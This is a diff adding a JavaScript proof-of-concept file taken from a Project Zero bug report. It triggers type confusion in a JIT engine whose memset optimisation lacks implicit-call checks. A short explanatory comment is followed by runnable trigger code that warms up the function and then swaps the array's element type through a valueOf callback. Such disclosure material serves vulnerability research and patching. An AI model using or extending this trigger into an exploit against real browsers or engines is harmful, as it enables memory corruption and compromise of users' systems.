@@ -1,0 +1,54 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1357
+
+function opt(a, b, v) {
+    if (b.length < 1)
+        return;
+
+    for (let i = 0; i < a.length; i++)
+        a[i] = v;
+
+    b[0] = 2.3023e-320;
+}
+
+The above JavaScript code is JITed as follows:
+
+... CHECKING THE TYPE OF B ...
+OP_Memset(a, v, a.length);
+b[0] = 2.3023e-320;
+
+But there's no ImplicitCallFlags checks around OP_Memset. So it fails to detect if the type of "b" was changed after the "OP_Memset" called.
+
+The PoC shows that it can result in type confusion.
+
+PoC:
+*/
+
+function opt(a, b, v) {
+    if (b.length < 1)
+        return;
+
+    for (let i = 0; i < a.length; i++)
+        a[i] = v;
+
+    b[0] = 2.3023e-320;
+}
+
+function main() {
+    for (let i = 0; i < 1000; i++) {
+        opt(new Uint8Array(100), [1.1, 2.2, 3.3], {});
+    }
+
+    let a = new Uint8Array(100);
+    let b = [1.1, 2.2, 3.3];
+    opt(a, b, {
+        valueOf: () => {
+            b[0] = {};
+            return 0;
+        }
+    });
+
+    print(b[0]);
+}
+
+main();
